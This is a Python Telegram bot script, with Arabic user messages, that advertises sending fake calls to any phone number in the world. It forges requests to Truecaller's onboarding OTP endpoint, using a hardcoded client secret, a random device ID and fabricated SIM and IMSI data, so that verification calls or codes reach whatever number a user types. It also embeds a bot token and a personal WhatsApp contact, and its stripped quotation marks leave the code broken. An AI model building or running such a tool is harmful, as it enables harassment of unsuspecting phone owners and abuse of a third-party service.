import requests
import hashlib, random
import telebot
from telebot import types
token = "5424002919:AAEgQDywN1C_3Ab0W8NYZqymVi5UEO13fNs"
bot = telebot.TeleBot(token)

@bot.message_handler(commands=[ start ])
def start(message):
  b = types.InlineKeyboardMarkup()
  b.add(brok)
  bot.reply_to(message, اهـــلآ بك في بـــوت طــرزان لارسال مــكالمات مزيفه الا اي رقم في العالم  قم بضغط علا /tarzan•👾\n+ ,reply_markup=b)



@bot.message_handler(commands=[ Hild ])
def tarzan(message):
  b = types.InlineKeyboardMarkup()
  b.add(brok)
  bot.reply_to(message, هلاً بك انا هنا لمساعدتك في اي شيئ تحتاجه فقط اطلب ما تحتاجه وسابذل قصاري جهدي لتقديم المساعده سواء كنت تبحث عن معلومات او اجابه اي اسئله او ترغب في الحصول علا توجيه في موضوع معين فانا هنا لخدمتك لا تتردد في طرح اي سؤال او طلب ما تحتاجه ساكون سعيد بتقديم المساعده بافضل ما لدي                                                                            طـــرزان                                                    رقمي وتساب                                                     https://wa.me/966571961318         \n+ ,reply_markup=b)





brok=types.InlineKeyboardButton(text=  معرفي تلي جرام  ,url="t.me/amr222tarzan")

@bot.message_handler(commands=[ tarzan ])
def tarzan(message):
  b = types.InlineKeyboardMarkup()
  b.add(brok)
  bot.reply_to(message, اهــلآ بــك الرسل  الرقم   مع رمز الدوله\n+ ,reply_markup=b)








asa =  123456789 
gigk = str(  .join(random.choice(asa) for i in range(10)))

md5 = hashlib.md5(gigk.encode()).hexdigest()[:16]


headers = {
    "Host": "account-asia-south1.truecaller.com",
    "content-type": "application/json; charset\u003dUTF-8",
    "content-length": "680",
    "accept-encoding": "gzip",
    "user-agent": "Truecaller/12.34.8 (Android;8.1.2)",
    "clientsecret": "lvc22mp3l1sfv6ujg83rd17btt"
  }

url = "https://account-asia-south1.truecaller.com/v3/sendOnboardingOtp"


@bot.message_handler(func=lambda m:True)
def number(message):

  data =  {"countryCode":"eg","dialingCode":20,"installationDetails":{"app":{"buildVersion":8,"majorVersion":12,"minorVersion":34,"store":"GOOGLE_PLAY"},"device":{"deviceId":" +md5+ ","language":"ar","manufacturer":"Xiaomi","mobileServices":["GMS"],"model":"Redmi Note 8A Prime","osName":"Android","osVersion":"7.1.2","simSerials":["8920022021714943876f","8920022022805258505f"]},"language":"ar","sims":[{"imsi":"602022207634386","mcc":"602","mnc":"2","operator":"vodafone"},{"imsi":"602023133590849","mcc":"602","mnc":"2","operator":"vodafone"}],"storeVersion":{"buildVersion":8,"majorVersion":12,"minorVersion":34}},"phoneNumber":" +message.text+ ","region":"region-2","sequenceNo":1} 

  req = requests.post(url, headers=headers, data=data).text

  bot.reply_to(message, تــم الرسال المكالمه اذاء ارت شي اخر او المساعده قم بضغط /Hild! )






print( run )

bot.infinity_polling()